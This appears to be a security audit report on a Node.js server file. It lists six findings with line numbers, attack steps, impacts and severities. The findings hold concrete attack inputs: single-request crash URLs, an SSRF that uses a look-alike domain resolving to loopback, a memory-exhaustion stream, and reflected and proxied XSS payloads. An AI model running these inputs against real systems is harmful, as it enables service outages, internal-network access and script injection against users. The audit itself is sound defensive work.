1. `server.js:15`

   - Attack: Send `GET /% HTTP/1.1`. `decodeURIComponent('/%')` throws an uncaught `URIError`.
   - Impact: A single unauthenticated request terminates the Node.js process, causing complete service denial.
   - Severity: **high**

2. `server.js:32`

   - Attack: Send `GET /preview HTTP/1.1`. The missing `url` parameter becomes `null`; `new URL(null)` rejects the `async` function, and the returned Promise is never handled.
   - Impact: On supported Node.js versions with native `fetch`, the unhandled rejection terminates the process, allowing single-request denial of service.
   - Severity: **high**

3. `server.js:33`

   - Attack: Register `evilimgcdn.net`, point its DNS record to `127.0.0.1`, and request `GET /preview?url=http%3A%2F%2Fevilimgcdn.net%3A3000%2Fadmin`. The hostname passes because `evilimgcdn.net`.endsWith(`imgcdn.net`) is true.
   - Impact: The attacker can make the server access loopback, private-network, or metadata services and receive their response through the proxy.
   - Severity: **high**

4. `server.js:39`

   - Attack: Have `evilimgcdn.net` return an unbounded chunked response, then request `GET /preview?url=http%3A%2F%2Fevilimgcdn.net%2Fendless`.
   - Impact: `arrayBuffer()` buffers the entire upstream response in memory. One large stream or several concurrent requests can exhaust memory and terminate the service.
   - Severity: **high**

5. `server.js:24`

   - Attack: Send a victim to `/​%3Csvg%20onload%3Dalert(document.domain)%3E`. When the file lookup fails, the response contains `<p>No such file: /<svg onload=alert(document.domain)></p>`.
   - Impact: Attacker-controlled JavaScript executes in the server’s origin, allowing same-origin data access and victim-authorized requests.
   - Severity: **medium**

6. `server.js:38`

   - Attack: Serve `<script>/* attacker code */</script>` with `Content-Type: text/html` from `evilimgcdn.net`, then send a victim to `/preview?url=http%3A%2F%2Fevilimgcdn.net%2Fpayload`.
   - Impact: The proxy returns the attacker’s active HTML from the application origin, enabling arbitrary same-origin JavaScript execution.
   - Severity: **medium**